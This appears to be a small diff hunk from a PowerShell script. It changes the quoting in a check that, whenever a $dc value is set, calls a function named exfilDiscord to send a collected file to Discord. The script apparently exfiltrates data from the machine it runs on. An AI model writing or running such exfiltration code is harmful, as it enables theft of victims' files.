@@ -164,7 +164,7 @@ function exfilDiscord {
 }
 
 # Checks the $dc value is not empty, and if so, sends the file to Discord.
-if (-not ([string]::IsNullOrEmpty($dc))){
+if (-not ([string]::IsNullOrEmpty("$dc"))){
     exfilDiscord -file $FileName
 }
 
